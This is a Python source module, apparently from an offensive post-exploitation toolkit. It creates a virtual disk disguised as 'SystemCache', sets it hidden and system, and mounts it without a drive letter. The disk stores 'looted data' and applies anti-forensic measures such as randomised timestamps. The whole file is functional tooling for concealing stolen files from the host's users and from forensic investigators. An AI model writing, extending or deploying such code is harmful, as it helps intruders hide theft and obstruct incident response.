"""
Hidden Virtual Disk Module

Creates and manages a hidden virtual disk (VHD/VHDX) for temporary storage
of files and looted data. The virtual disk is mounted but not visible in
normal file system operations, providing a secure temporary storage location
that doesn't leave traces on the host file system.

Features:
- Create hidden VHD/VHDX disk
- Mount disk without drive letter assignment
- Access via UNC path or volume GUID
- Automatic cleanup on unmount
- Full file system access while hidden
"""

import os
import sys
import subprocess
import tempfile
import uuid
from typing import Optional, Tuple, Dict, Any, List
from pathlib import Path
from modules.utils import execute_powershell, execute_cmd
from modules.anti_forensics import AntiForensics


class HiddenVirtualDisk:
    """Manages hidden virtual disk for temporary file storage"""
    
    def __init__(self, lab_use: int = 0, disk_size_gb: int = 10):
        self.lab_use = lab_use
        self.disk_size_gb = disk_size_gb
        self.disk_path: Optional[str] = None
        self.mount_path: Optional[str] = None
        self.volume_guid: Optional[str] = None
        self.disk_number: Optional[int] = None
        self.anti_forensics = AntiForensics(lab_use=lab_use)
        self._is_mounted = False
    
    def create_vhd(self, disk_path: Optional[str] = None, 
                   size_gb: Optional[int] = None,
                   format: str = 'VHDX') -> Tuple[bool, Optional[str]]:
        """
        Create a virtual hard disk (VHD/VHDX)
        
        Args:
            disk_path: Path where VHD will be created (None = temp location)
            size_gb: Size in GB (None = use default)
            format: VHD format ('VHD' or 'VHDX')
        
        Returns:
            Tuple of (success, disk_path)
        """
        try:
            if disk_path is None:
                # Create in temp directory with hidden attributes
                temp_dir = tempfile.gettempdir()
                disk_name = f"SystemCache_{uuid.uuid4().hex[:8]}.{format.lower()}"
                disk_path = os.path.join(temp_dir, disk_name)
            
            if size_gb is None:
                size_gb = self.disk_size_gb
            
            # Create VHD using PowerShell (requires SYSTEM privileges)
            ps_cmd = f"""
            $ErrorActionPreference = 'Stop'
            try {{
                # Create VHDX file
                $vhdPath = '{disk_path}'
                $sizeBytes = {size_gb}GB
                
                # Create VHDX using New-VHD
                $vhd = New-VHD -Path $vhdPath -SizeBytes $sizeBytes -Dynamic -ErrorAction Stop
                
                Write-Host "VHD created: $vhdPath"
                Write-Host "Size: $($vhd.Size / 1GB) GB"
                
                # Set hidden and system attributes
                $file = Get-Item $vhdPath -Force
                $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                
                Write-Host "VHD attributes set (hidden, system)"
                Write-Output $vhdPath
                exit 0
            }} catch {{
                Write-Error "Failed to create VHD: $_"
                exit 1
            }}
            """
            
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            if exit_code == 0:
                self.disk_path = disk_path.strip() if stdout.strip() else disk_path
                return True, self.disk_path
            else:
                print(f"Error creating VHD: {stderr}")
                return False, None
        
        except Exception as e:
            print(f"Exception creating VHD: {e}")
            return False, None
    
    def mount_vhd(self, disk_path: Optional[str] = None,
                  assign_drive_letter: bool = False) -> Tuple[bool, Optional[str]]:
        """
        Mount VHD without assigning drive letter (hidden mount)
        
        Args:
            disk_path: Path to VHD file (None = use created disk)
            assign_drive_letter: Assign drive letter (False = hidden mount)
        
        Returns:
            Tuple of (success, mount_path/volume_guid)
        """
        try:
            if disk_path is None:
                disk_path = self.disk_path
            
            if disk_path is None:
                return False, None
            
            if assign_drive_letter:
                # Mount with drive letter (visible)
                ps_cmd = f"""
                $ErrorActionPreference = 'Stop'
                try {{
                    $vhd = Mount-VHD -Path '{disk_path}' -PassThru -ErrorAction Stop
                    $disk = Get-Disk -Number $vhd.DiskNumber
                    $volume = Get-Volume -DiskNumber $disk.Number | Select-Object -First 1
                    
                    # Initialize and format if needed
                    if ($disk.PartitionStyle -eq 'Raw') {{
                        Initialize-Disk -Number $disk.Number -PartitionStyle GPT -ErrorAction Stop
                        $partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -AssignDriveLetter -ErrorAction Stop
                        Format-Volume -Partition $partition -FileSystem NTFS -NewFileSystemLabel 'SystemCache' -ErrorAction Stop
                        $volume = Get-Volume -Partition $partition
                    }}
                    
                    Write-Output $volume.DriveLetter
                    exit 0
                }} catch {{
                    Write-Error "Failed to mount VHD: $_"
                    exit 1
                }}
                """
            else:
                # Mount without drive letter (hidden)
                ps_cmd = f"""
                $ErrorActionPreference = 'Stop'
                try {{
                    # Mount VHD
                    $vhd = Mount-VHD -Path '{disk_path}' -PassThru -ErrorAction Stop
                    $diskNumber = $vhd.DiskNumber
                    
                    # Initialize disk if needed
                    $disk = Get-Disk -Number $diskNumber
                    if ($disk.PartitionStyle -eq 'Raw') {{
                        Initialize-Disk -Number $diskNumber -PartitionStyle GPT -ErrorAction Stop
                        $partition = New-Partition -DiskNumber $diskNumber -UseMaximumSize -ErrorAction Stop
                        Format-Volume -Partition $partition -FileSystem NTFS -NewFileSystemLabel 'SystemCache' -ErrorAction Stop
                    }}
                    
                    # Get volume GUID (no drive letter)
                    $volume = Get-Volume -DiskNumber $diskNumber | Select-Object -First 1
                    $volumeGuid = $volume.UniqueId
                    
                    # Get mount path via volume GUID
                    $mountPath = "\\\\?\\Volume{$volumeGuid}\\"
                    
                    Write-Host "VHD mounted (hidden)"
                    Write-Host "Disk Number: $diskNumber"
                    Write-Host "Volume GUID: $volumeGuid"
                    Write-Host "Mount Path: $mountPath"
                    
                    Write-Output $mountPath
                    exit 0
                }} catch {{
                    Write-Error "Failed to mount VHD: $_"
                    exit 1
                }}
                """
            
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            if exit_code == 0:
                mount_path = stdout.strip()
                self.mount_path = mount_path
                self._is_mounted = True
                
                # Extract disk number and volume GUID
                ps_get_info = f"""
                $vhd = Get-VHD -Path '{disk_path}'
                $disk = Get-Disk -Number $vhd.DiskNumber
                $volume = Get-Volume -DiskNumber $disk.Number | Select-Object -First 1
                Write-Output "$($vhd.DiskNumber)|$($volume.UniqueId)"
                """
                exit_code2, stdout2, stderr2 = execute_powershell(ps_get_info, lab_use=self.lab_use)
                if exit_code2 == 0:
                    parts = stdout2.strip().split('|')
                    if len(parts) == 2:
                        self.disk_number = int(parts[0])
                        self.volume_guid = parts[1]
                
                return True, mount_path
            else:
                print(f"Error mounting VHD: {stderr}")
                return False, None
        
        except Exception as e:
            print(f"Exception mounting VHD: {e}")
            return False, None
    
    def unmount_vhd(self, disk_path: Optional[str] = None) -> bool:
        """
        Unmount VHD
        
        Args:
            disk_path: Path to VHD file (None = use created disk)
        
        Returns:
            True if successful
        """
        try:
            if disk_path is None:
                disk_path = self.disk_path
            
            if disk_path is None:
                return False
            
            ps_cmd = f"""
            $ErrorActionPreference = 'Stop'
            try {{
                Dismount-VHD -Path '{disk_path}' -ErrorAction Stop
                Write-Host "VHD unmounted successfully"
                exit 0
            }} catch {{
                Write-Error "Failed to unmount VHD: $_"
                exit 1
            }}
            """
            
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            if exit_code == 0:
                self._is_mounted = False
                self.mount_path = None
                self.volume_guid = None
                self.disk_number = None
                return True
            else:
                print(f"Error unmounting VHD: {stderr}")
                return False
        
        except Exception as e:
            print(f"Exception unmounting VHD: {e}")
            return False
    
    def create_and_mount(self, size_gb: Optional[int] = None,
                        hidden: bool = True) -> Tuple[bool, Optional[str]]:
        """
        Create and mount VHD in one operation
        
        Args:
            size_gb: Size in GB (None = use default)
            hidden: Mount without drive letter (hidden)
        
        Returns:
            Tuple of (success, mount_path)
        """
        success, disk_path = self.create_vhd(size_gb=size_gb)
        if not success:
            return False, None
        
        success, mount_path = self.mount_vhd(disk_path, assign_drive_letter=not hidden)
        return success, mount_path
    
    def store_file(self, source_path: str, 
                  dest_name: Optional[str] = None,
                  apply_anti_forensics: bool = True) -> Tuple[bool, Optional[str]]:
        """
        Store file in hidden virtual disk
        
        Args:
            source_path: Path to source file
            dest_name: Destination filename (None = use source name)
            apply_anti_forensics: Apply anti-forensic measures
        
        Returns:
            Tuple of (success, destination_path)
        """
        if not self._is_mounted or self.mount_path is None:
            return False, None
        
        try:
            if dest_name is None:
                dest_name = os.path.basename(source_path)
            
            dest_path = os.path.join(self.mount_path, dest_name)
            
            # Copy file
            import shutil
            shutil.copy2(source_path, dest_path)
            
            # Apply anti-forensics if requested
            if apply_anti_forensics:
                self.anti_forensics.apply_anti_forensics(
                    dest_path,
                    hidden=True,
                    system=True,
                    randomize_timestamps=True
                )
            
            return True, dest_path
        
        except Exception as e:
            print(f"Error storing file: {e}")
            return False, None
    
    def store_data(self, data: bytes, filename: str,
                  apply_anti_forensics: bool = True) -> Tuple[bool, Optional[str]]:
        """
        Store data directly in hidden virtual disk
        
        Args:
            data: Data to store (bytes)
            filename: Filename
            apply_anti_forensics: Apply anti-forensic measures
        
        Returns:
            Tuple of (success, destination_path)
        """
        if not self._is_mounted or self.mount_path is None:
            return False, None
        
        try:
            dest_path = os.path.join(self.mount_path, filename)
            
            # Write data
            with open(dest_path, 'wb') as f:
                f.write(data)
            
            # Apply anti-forensics if requested
            if apply_anti_forensics:
                self.anti_forensics.apply_anti_forensics(
                    dest_path,
                    hidden=True,
                    system=True,
                    randomize_timestamps=True
                )
            
            return True, dest_path
        
        except Exception as e:
            print(f"Error storing data: {e}")
            return False, None
    
    def list_files(self) -> List[str]:
        """
        List files in hidden virtual disk
        
        Returns:
            List of file paths
        """
        if not self._is_mounted or self.mount_path is None:
            return []
        
        try:
            files = []
            for root, dirs, filenames in os.walk(self.mount_path):
                for filename in filenames:
                    file_path = os.path.join(root, filename)
                    files.append(file_path)
            return files
        except Exception as e:
            print(f"Error listing files: {e}")
            return []
    
    def cleanup(self, remove_vhd: bool = True) -> bool:
        """
        Cleanup: unmount and optionally remove VHD
        
        Args:
            remove_vhd: Remove VHD file after unmount
        
        Returns:
            True if successful
        """
        try:
            # Unmount first
            if self._is_mounted:
                self.unmount_vhd()
            
            # Remove VHD file if requested
            if remove_vhd and self.disk_path and os.path.exists(self.disk_path):
                # Remove hidden/system attributes first
                ps_cmd = f"""
                $file = Get-Item '{self.disk_path}' -Force
                $file.Attributes = [System.IO.FileAttributes]::Normal
                Remove-Item '{self.disk_path}' -Force
                """
                execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            return True
        except Exception as e:
            print(f"Error during cleanup: {e}")
            return False
    
    def get_mount_info(self) -> Dict[str, Any]:
        """
        Get information about mounted virtual disk
        
        Returns:
            Dictionary with mount information
        """
        return {
            'disk_path': self.disk_path,
            'mount_path': self.mount_path,
            'volume_guid': self.volume_guid,
            'disk_number': self.disk_number,
            'is_mounted': self._is_mounted
        }


def create_hidden_storage(size_gb: int = 10, lab_use: int = 0) -> Optional[HiddenVirtualDisk]:
    """
    Convenience function to create and mount hidden virtual disk
    
    Args:
        size_gb: Size in GB
        lab_use: LAB_USE flag
    
    Returns:
        HiddenVirtualDisk instance or None
    """
    vdisk = HiddenVirtualDisk(lab_use=lab_use, disk_size_gb=size_gb)
    success, mount_path = vdisk.create_and_mount(hidden=True)
    if success:
        return vdisk
    return None
